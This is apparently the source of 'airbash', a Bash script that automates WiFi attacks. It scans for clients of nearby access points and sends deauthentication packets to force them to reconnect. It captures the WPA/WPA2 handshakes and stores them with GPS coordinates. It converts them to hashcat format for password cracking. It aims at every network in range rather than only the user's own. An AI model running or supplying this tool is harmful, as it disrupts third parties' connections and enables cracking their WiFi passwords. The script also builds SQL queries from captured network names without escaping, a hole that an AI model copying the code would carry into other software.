# This is the airbash main script (https://github.com/tehw0lf/airbash)
# Written by tehw0lf
# This script is an automated WPA/WPA2 handshake collector which uses
# software from https://aircrack-ng.org. First, the script will scan for
# WiFi clients that are connected to access points. Then, each client receives
# a deauthentication packet that should terminate its connection to the
# access point, thus forcing a reconnect. In order to capture the handshake,
# airodump is being run after sending the deauthentication packet. Verification
# of a captured handshake is done using aircrack-ng

check_for_handshake() {
  # checks a handshake (passed by file name) using aircrack-ng
  # returns 1 on success and 0 on failure
  for captured_bssid in $(ls "$1"*.cap 2>/dev/null); do
    if [ $("$AIRCRACK_BINARY" -a 2 "$captured_bssid" -w "$wordlist_directory/"known_passwords.txt 2>/dev/null | grep -c valid) -eq 0 ]; then
      aircrack_output=$("$AIRCRACK_BINARY" -a 2 "$captured_bssid" -w "$wordlist_directory/"known_passwords.txt 2>/dev/null | grep handshake)
      if [ "$aircrack_output" == "" ]; then
        handshake_captured=0
      else      
        handshake_row=$(echo "$aircrack_output" | awk '{print $5}')
        if [ "$handshake_row" != "(0" ]; then
          handshake_captured=1
        fi
      fi
    fi
    aircrack_output=""
    handshake_row=""
  done
}
kill_aireplay_processes() {
  # kill all instances of aireplay-ng to prevent locking
  for pid in $(pgrep $(basename "$AIREPLAY_BINARY")); do
    { kill $pid && wait $pid; } &>/dev/null
  done
}
kill_airodump_processes() {
  # kill all instances of airodump-ng to prevent locking
  for pid in $(pgrep $(basename "$AIRODUMP_BINARY")); do
    { kill $pid && wait $pid; } &>/dev/null
  done
}

# enviro stuff
INTERFACE="wlan0"
AIRCRACK_BINARY=$(which aircrack-ng)
AIRODUMP_BINARY=$(which airodump-ng)
AIREPLAY_BINARY=$(which aireplay-ng)
SQLITE3_BINARY=$(which sqlite3)
HC2HCX_BINARY=$(which wlanhc2hcx)

if [ -z "$AIRCRACK_BINARY" ]; then
  echo "Make sure aircrack-ng is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$AIRODUMP_BINARY" ]; then
  echo "Make sure airodump-ng is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$AIREPLAY_BINARY" ]; then
  echo "Make sure aireplay-ng is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$SQLITE3_BINARY" ]; then
  echo "Make sure sqlite3 is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$HC2HCX_BINARY" ]; then
  echo -e "Make sure hcxtools' wlanhc2hcx is on your path or in $base_directory!\n  Source available at https://github.com/ZerBea/hcxtools/blob/master/wlanhc2hcx.c"
  echo ".hccapx conversion unavailable"
fi

# configure path variables
base_directory=$(realpath .)
database_filename=".database.sqlite3"
blacklist=".blacklist"
handshake_directory="$base_directory/.handshakes"
location_directory="$base_directory/.location"
wordlist_directory="$base_directory/.wordlists"
initial_scan_prefix="initlist"
initial_scan_file="$initial_scan_prefix-01.csv"

# create nonexisting paths and files
mkdir "$handshake_directory" &>/dev/null
touch "$base_directory/$blacklist"
kill_airodump_processes

# clean up previous files (and .tar backups if present)
rm -f "$base_directory/"initlist &>/dev/null
rm -f "$base_directory/"*.csv &>/dev/null
rm -f "$base_directory/"*.cap &>/dev/null

# initial 20 second scan to determine targets
{ "$AIRODUMP_BINARY" -w $base_directory/$initial_scan_prefix -o csv $INTERFACE &>/dev/null; } &
sleep 20
kill_airodump_processes
access_point_counter=1
$(tr -d ' ' < $base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' >"$base_directory/"num_access_points.lst)
num_access_points=$(wc -l <"$base_directory/"num_access_points.lst)
$(rm -f "$base_directory/"num_access_points.lst)
# stage 1: access points (scan and apply filters)
for access_point in $(tr -d ' ' < $base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'); do
  channel=$(tr -d ' ' < $base_directory/$initial_scan_file 2>/dev/null | grep $access_point | awk -F ',' 'NR==1{print $4}')
  echo "_$access_point_counter/$num_access_points    "
  { "$AIRODUMP_BINARY" -c $channel --bssid $access_point -w $base_directory/$access_point -o pcap $INTERFACE &>/dev/null; } &
  sleep 2
  if [ $(grep -c $access_point "$base_directory/$blacklist" 2>/dev/null) -gt 0 ]; then
    # blacklisted access point
    echo "-         "
    kill_airodump_processes
    access_point_counter=$((access_point_counter + 1))
    continue
  fi
  if [ $("$SQLITE3_BINARY" "$base_directory/$database_filename" "SELECT * FROM handshake_directory WHERE bssid='$access_point'" 2>/dev/null | grep -c $access_point) -gt 0 ]; then
    # handshake for access point present in database
    echo "x         "
    kill_airodump_processes
    access_point_counter=$((access_point_counter + 1))
    continue
  fi
  if [ $(ls "$base_directory/$access_point"*.cap 2>/dev/null | grep -c cap) -eq 0 ]; then
    # access point is not reachable anymore
    echo "?         "
    kill_airodump_processes
    access_point_counter=$((access_point_counter + 1))
    continue
  fi
  client_counter=1
  $(tr -d ' ' < $base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' >"$base_directory/"num_clients.lst)
  num_clients=$(wc -l <"$base_directory/"num_clients.lst)
  rm -f "$base_directory/"num_clients.lst
  # stage 2: deauthenticate clients and try to capture handshake
  for client in $(tr -d ' ' < $base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'); do
    client_bssid=$(tr -d ' ' < $base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $client | grep $access_point | awk -F ',' '{print $6}')
    if [ "$client_bssid" == "$access_point" ]; then
      echo "__$client_counter/$num_clients    "
      # send a single deauthentication packet
      { "$AIREPLAY_BINARY" -0 1 -a $access_point -c $client -F $INTERFACE &>/dev/null; } &
      sleep 5
      handshake_captured=0
      check_for_handshake "$base_directory/$access_point"
      if [ $handshake_captured -eq 1 ]; then
        kill_aireplay_processes
        break
      fi
      kill_aireplay_processes
      client_counter=$((client_counter + 1))
    else
      client_counter=$((client_counter + 1))
    fi
  done
  sleep 5
  kill_airodump_processes
  access_point_counter=$((access_point_counter + 1))
done
rm -f "$base_directory/"initlist*
handshake_counter=0
# finalize by inserting data for captured handshakes into database
# and converting the .pcap to a .hccapx file for use with hashcat
for capture_file in $(ls "$base_directory/"*.cap 2>/dev/null); do
  if [ $("$AIRCRACK_BINARY" -a 2 "$capture_file" -w "$wordlist_directory/"known_passwords.txt 2>/dev/null | grep -c valid) -eq 0 ]; then
    aircrack_output=$("$AIRCRACK_BINARY" -a 2 "$capture_file" -w "$wordlist_directory/"known_passwords.txt 2>/dev/null | grep handshake)
    if [ "$aircrack_output" == "" ]; then
      continue
    fi
    location_output=$(sed '2q;d' "$location_directory/"*.txt 2>/dev/null)
    if [ $(echo "$aircrack_output" | awk '{print $5}') == "(0" ]; then
      rm -f "$capture_file"
    else
      bssid=$(echo "$aircrack_output" | awk '{print $2}')
      essid=$(echo "$aircrack_output" | awk '{for (F=3;F<=NF-3;++F) printf " %s", ($F)}')
      essid=${essid:1:${#essid}}
      latitude=$(echo "$location_output" | awk -F ',' '{print $2}')
      longitude=$(echo "$location_output" | awk -F ',' '{print $3}')
      "$SQLITE3_BINARY" "$base_directory/$database_filename" "INSERT INTO handshakes(latitude, longitude, bssid, essid) VALUES('$latitude', '$longitude', '$bssid', '$essid');" 2>/dev/null
      "$AIRCRACK_BINARY" "$capture_file" -J "$capture_file" &>/dev/null
      "$HC2HCX_BINARY" -o "$handshake_directory/$bssid".hccapx "$capture_file".hccap &>/dev/null
      mv "$capture_file" "$handshake_directory/"
      rm -f "$capture_file".hccap
      handshake_counter=$((handshake_counter + 1))
    fi
  else
    rm -f "$capture_file"
  fi
done
echo "_______"
echo "$handshake_counter!"
